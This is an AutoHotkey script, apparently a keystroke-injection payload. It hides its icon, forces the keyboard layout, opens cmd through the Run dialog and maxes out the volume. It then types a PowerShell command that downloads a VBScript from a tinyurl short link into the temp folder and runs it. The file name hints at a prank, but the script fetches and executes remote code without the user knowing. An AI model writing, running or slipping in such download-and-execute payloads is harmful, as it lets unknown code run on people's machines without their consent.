#NoEnv
#Persistent
#NoTrayIcon
SetDefaultKeyboard(LocaleID){
	Static SPI_SETDEFAULTINPUTLANG := 0x005A, SPIF_SENDWININICHANGE := 2
	Lan := DllCall("LoadKeyboardLayout", "Str", Format("{:08x}", LocaleID), "Int", 0)
	VarSetCapacity(binaryLocaleID, 4, 0)
	NumPut(LocaleID, binaryLocaleID)
	DllCall("SystemParametersInfo", "UInt", SPI_SETDEFAULTINPUTLANG, "UInt", 0, "UPtr", &binaryLocaleID, "UInt", SPIF_SENDWININICHANGE)
	
	WinGet, windows, List
	Loop % windows {
		PostMessage 0x50, 0, % Lan, , % "ahk_id " windows%A_Index%
	}
}
SendMode Input
Sleep 3500
SetDefaultKeyboard(0x0409) ;
Send #r
Sleep 200
Sleep 200
Send cmd
Send {enter}
Sleep 200
Send {Shift}
Sleep 200
SoundGet, MuteState, Master, Mute
if MuteState=On 
{
	send {Volume_Mute}
}
SoundSet, 100
Send powershell (new-object System.Net.WebClient).DownloadFile('https://tinyurl.com/2fzp97ve','`%tmp`%\\rickU.vbs'); && start `%tmp`%\\rickU.vbs && exit
Send {enter}
ExitApp